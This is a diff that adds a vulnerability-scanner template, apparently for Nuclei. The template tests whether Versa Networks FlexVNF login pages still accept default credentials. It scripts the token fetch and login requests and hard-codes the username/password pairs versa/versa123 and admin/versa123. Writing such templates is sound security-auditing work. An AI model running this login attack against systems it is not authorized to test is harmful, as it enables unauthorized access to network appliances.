@@ -1,0 +1,61 @@
+id: versa-flexvnf-ui-default-login
+
+info:
+  name: Versa Networks FlexVNF UI Default Login
+  author: c-sh0
+  severity: high
+  description: Versa Networks FlexVNF UI default login
+  reference:
+    - https://versa-networks.com/products/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  tags: default-login,panel,versa,sdwan,flexvnf
+
+requests:
+  - raw:
+      - |
+        GET /authenticate HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /authenticate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+        CSRF-Token: {{xsrf_token}}
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - versa
+        - admin
+      password:
+        - versa123
+        - versa123
+
+    cookie-reuse: true
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        part: body
+        words:
+          - "{\"username\":\"{{username}}\",\"error\":false}"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: xsrf_token
+        group: 1
+        internal: true
+        part: header
+        regex:
+          - '(?i)Set-Cookie: XSRF-TOKEN=([A-Za-z0-9_.-]+)'
